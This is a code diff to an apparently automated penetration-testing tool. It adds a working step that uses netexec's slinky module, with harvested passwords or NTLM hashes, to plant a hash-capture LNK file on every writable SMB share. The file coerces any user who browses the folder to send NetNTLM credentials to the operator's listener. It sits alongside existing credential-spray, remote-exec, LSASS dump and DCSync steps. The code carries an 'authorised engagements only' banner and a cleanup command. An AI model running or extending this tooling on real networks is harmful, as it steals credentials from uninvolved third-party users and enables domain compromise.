@@ -2223,6 +2223,15 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2am) smb-writable: hash-capture LNK planted on a writable share → coerces browsers
+    if sid == "smb-writable":
+        hits = re.findall(r"^✗ PLANT (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = ", ".join(h.strip() for h in hits[:4]) + (f" +{len(hits) - 4}" if len(hits) > 4 else "")
+        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                "summary": f"writable share — hash-capture LNK planted: {shown}"[:140]}
+
     # 2al) smb-dump: credential material dumped (SAM/LSA/LSASS) or the domain (DCSync/NTDS)
     if sid == "smb-dump":
         dc = re.findall(r"^✗ DCSYNC (.+)$", output, re.M)
@@ -2947,7 +2956,7 @@ _EXPLOIT_STEPS = {
         ("Spray creds & hashes (mind lockout)", "smb-spray"),
         ("Valid creds / hash → shell", "smb-exec"),
         ("Dump SAM / LSA / LSASS; DCSync", "smb-dump"),
-        "Writable share → hash capture / payload",
+        ("Writable share → hash capture / payload", "smb-writable"),
         # ── land a shell & foothold ──
         "Spawn & upgrade an interactive shell",
         # ── manual steps, tailored to what this host exposed ──
@@ -9599,6 +9608,69 @@ def _tool_smb_dump(ip: str, port: int, proto: str) -> str:
     return f"Credential dump / DCSync — {len(admins)} admin host(s)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 12: writable share → planted LNK for hash capture (WRITES + reversible) ──
+_SMBWRITABLE_DEADLINE = 180      # s — overall cap
+_SMBWRITABLE_NAME = "~pshunter"  # recognizable, reversible marker for the planted LNK
+
+
+def _tool_smb_writable(ip: str, port: int, proto: str) -> str:
+    """SMB step 12 tool: plant a hash-capture Windows shortcut (LNK, via netexec slinky) on
+    every writable share, its icon pointing at our listener — any user who browses the folder
+    in Explorer is coerced into authenticating to us, and the NetNTLM lands at Responder (r5)
+    / relay (r6). This is the ONLY SMB tool that WRITES to a target: the file is left in place
+    (it must stay to catch a browser), marked with a recognizable name, and fully reversible —
+    the report prints the exact CLEANUP command. Tries harvested creds then null/guest. Needs a
+    listener running elsewhere. No root. Raises without netexec or a writable share. This
+    coerces third-party hosts — authorised internal engagements ONLY."""
+    import time
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        raise RuntimeError("netexec not found — install it to plant hash-capture files")
+    lhost = _foothold_lhost(ip)
+    if not lhost:
+        raise RuntimeError(f"could not determine our listener IP toward {ip}")
+    deadline = time.time() + _SMBWRITABLE_DEADLINE
+
+    planted, used, reached = [], None, False
+    for dom, user, pw, label in _smb_gpp_attempts(ip, port, proto):
+        if time.time() > deadline:
+            break
+        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", pw))
+        auth = _smb_auth_nxc(dom, user, pw) if not is_hash else \
+            (["-u", user, "-H", pw] + (["-d", dom] if dom else []))
+        _, out = _smb_run([nxc, "smb", ip, *auth, "-M", "slinky",
+                           "-o", f"SERVER={lhost}", f"NAME={_SMBWRITABLE_NAME}", "CLEANUP=False"], 90)
+        if re.search(r"\b445\b", out):
+            reached = True
+        if not re.search(r"\b445\b.*\[\+\]", out):
+            continue
+        for ln in out.splitlines():               # collect shares where the LNK was written
+            if re.search(r"creat|written|\.lnk", ln, re.I) and not re.search(r"fail|error|\[-\]", ln, re.I):
+                ms = re.search(r"on (?:the )?(\S+) share|\bshare[:\s]+(\S+)|\\\\[^\\]+\\([^\\\s]+)", ln, re.I)
+                share = next((g for g in (ms.groups() if ms else []) if g), None)
+                if share and share not in planted:
+                    planted.append(share)
+        if planted or re.search(r"\bslinky\b.*\[\+\]", out, re.I):
+            used = label
+            break
+    if not reached:
+        raise RuntimeError(f"{ip}:{port} did not answer (unreachable / not SMB?)")
+
+    lines = [f"[*] Target: {ip}   LISTENER: {lhost}   Auth: {used or 'none accepted'}"]
+    for share in planted:
+        lines.append(f"✗ PLANT {share}")
+    if used and not planted:
+        lines.append(f"✗ PLANT (writable share(s) — {_SMBWRITABLE_NAME}.lnk)")
+    if used:
+        lines.append(f"· start a listener (relay r6 / poison r5) — Explorer browsers coerce to {lhost}")
+        lines.append(f"· CLEANUP: nxc smb {ip} -u <user> -p|-H <secret> -M slinky "
+                     f"-o SERVER={lhost} NAME={_SMBWRITABLE_NAME} CLEANUP=True")
+    else:
+        lines.append("· no writable share / no session accepted — need creds "
+                     "(smb-loot r3) or an anonymous writable share")
+    return f"Writable-share hash capture — {ip}  (plants {_SMBWRITABLE_NAME}.lnk)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9639,6 +9711,7 @@ _STEP_TOOLS = {
     "smb-spray": ("Credential spray across hosts (netexec, reuse/lateral → admin)", _tool_smb_spray),
     "smb-exec": ("Confirm command exec over admin creds (netexec -x → feeds foothold)", _tool_smb_exec),
     "smb-dump": ("Dump SAM/LSA/LSASS/DPAPI + DCSync NTDS (netexec, admin creds)", _tool_smb_dump),
+    "smb-writable": ("Writable share → plant hash-capture LNK (netexec slinky, reversible)", _tool_smb_writable),
 }
 
 def _mins(seconds: int) -> str:
@@ -9694,6 +9767,7 @@ _STEP_TOOL_RUNS = {
     "smb-spray":        ("netexec", f"{_mins(_SMBSPRAY_DEADLINE)} min"),
     "smb-exec":         ("netexec -x", f"{_mins(_SMBEXEC_DEADLINE)} min"),
     "smb-dump":         ("netexec --sam/--lsa/--ntds", f"{_mins(_SMBDUMP_DEADLINE)} min"),
+    "smb-writable":     ("netexec slinky", f"{_mins(_SMBWRITABLE_DEADLINE)} min"),
 }
 
 
@@ -9855,6 +9929,11 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-writable":                # WRITES to the target — reversible, blast radius
+        print(f"{YELLOW}   ⚠ WRITES to the target{RESET}{DIM} — plants {BOLD}{_SMBWRITABLE_NAME}.lnk{RESET}"
+              f"{DIM} on writable shares to capture NetNTLM from any browsing user (third parties); "
+              f"reversible (report prints CLEANUP) · start {BOLD}relay r6{RESET}{DIM}/{BOLD}poison r5"
+              f"{RESET}{DIM} to catch it · {RESET}{YELLOW}authorised internal engagements only{RESET}")
     if tool_key == "smb-dump":                    # deep loot over proven admin creds
         na = len(_gather_smb_admin())
         print(f"{DIM}   dumps SAM/LSA/LSASS/DPAPI + DCSync (--ntds) over {BOLD}{na}{RESET}{DIM} admin "
